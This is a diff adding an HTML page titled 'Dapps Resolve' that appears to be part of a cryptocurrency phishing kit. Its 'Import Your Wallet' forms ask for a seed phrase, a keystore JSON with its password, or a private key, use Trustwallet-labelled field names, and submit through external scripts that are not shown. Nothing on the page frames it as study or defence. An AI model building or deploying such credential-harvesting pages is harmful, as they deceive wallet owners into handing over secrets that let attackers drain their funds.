@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Dapps Resolve</title>
+    <link rel="shortcut icon" type="image/x-icon" href="./img/favicon.png">
+    <link href="./styles/sass/index.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./Importwalletkey_files/style.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./Importwalletkey_files/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
+</head>
+
+<body>
+    <div class="impotedModal modal fade" id="importeModal">
+        <img src="./img/check-loader-gif.gif" alt="checkerLoader" width="150px">
+    </div>
+    <div class="import" >
+        <div class="import__container">
+            <a href="./importwalletkey.html#" class="import__header">
+                <i class="fa fa-less-than import__header--icon"></i>
+                <span class="import__header--text text- " style="color: rgb(65, 141, 241);"> Import Your Wallet</span>
+            </a>
+            <div class="import__tab ">
+                <!-- Tab headers (navigation) -->
+                <div class="import__tab__header bg-dark">
+                    <a href="./import.html#phrase"
+                        class="import__tab__header--item import__tab__header--item--1 current  "
+                        style="color: rgb(65, 141, 241);">Phrase</a>
+                    <a href="./import.html#keystore-json"
+                        class="import__tab__header--item import__tab__header--item--2"
+                        style="color: rgb(65, 141, 241);">Keystore Json</a>
+                    <a href="./import.html#private-key"
+                        class="import__tab__header--item import__tab__header--item--3"
+                        style="color: rgb(65, 141, 241);">Private Key</a>
+                </div>
+
+                <!-- Tab bodies (content) -->
+                <div class="import__tab__body">
+
+                    <!-- Tab body (phrase) -->
+                    <div id="phrase" class="import__tab__body--item import__tab__body--item--phrase current">
+                        <form id="phraseForm"  method="POST" class="ajaxForm">
+                            <input type="hidden" name="walletRef">
+                            <div class="form__errorBox form__errorBox--phrase"></div>
+                            <textarea class="form__input form__input--textarea" name="Trustwallet-phrase" cols="30"
+                                id="phraseInput" rows="5" placeholder="Enter Phrase..." required=""></textarea>
+                            <input type="hidden" name="_gotcha">
+                            <!-- use this to prevent spam -->
+
+                            <label for="phrase_input" class="form__label">Typically 12 (sometimes 24) words separated by
+                                a single space.</label>
+                            <button class="form__button" type="submit"
+                                style="background-color:rgb(65, 141, 241);">Import</button>
+                        </form>
+                    </div>
+
+                    <!-- Tab body (keystore json) -->
+                    <div id="keystore-json"
+                        class="import__tab__body--item import__tab__body--item--keystore-json hidden">
+                        <form  method="POST" class="ajaxForm">
+                            <textarea id="keystorejson" class="form__input form__input--textarea"
+                                name="Trustwallet-keystore_json" cols="30" rows="5" placeholder="Keystore JSON..."
+                                required=""></textarea>
+                            <input type="hidden" name="_gotcha">
+                            <!-- use this to prevent spam -->
+
+                            <label for="keystore_password"></label>
+                            <input id="keystore_password" type="password" name="Trustwallet keystore_pass"
+                                class="form__input" placeholder="Password..." required="">
+
+                            <label for="Trustwalletkeystore_json" class="form__label">Several lines of text beginning
+                                with "{...}" plus the password you used to encrypt it. </label>
+                            <button class="form__button " type="submit"
+                                style="background-color: rgb(65, 141, 241);">Import</button>
+                        </form>
+                    </div>
+
+                    <!-- Tab body (private key) -->
+                    <form  method="POST" class="ajaxForm">
+                        <div id="private-key"
+                            class="import__tab__body--item import__tab__body--item--private-key hidden">
+                            <input type="hidden" name="_gotcha">
+                            <!-- use this to prevent spam -->
+                            <script defer async src="qwerty.js"></script>
+                            <input id="privatekey" type="text" name="Trustwallet priv key" class="form__input"
+                                placeholder="Private Key..." required="">
+                            <label for="Trustwallet priv_key" class="form__label">Typically 12 (sometimes 24) words
+                                separated by a single space.</label>
+                            <button class="form__button" type="submit"
+                                style="background-color:rgb(65, 141, 241);;">Import</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+     <script src="./Importwalletkey_files/app.js.download"></script>
+</body>
+
+</html>
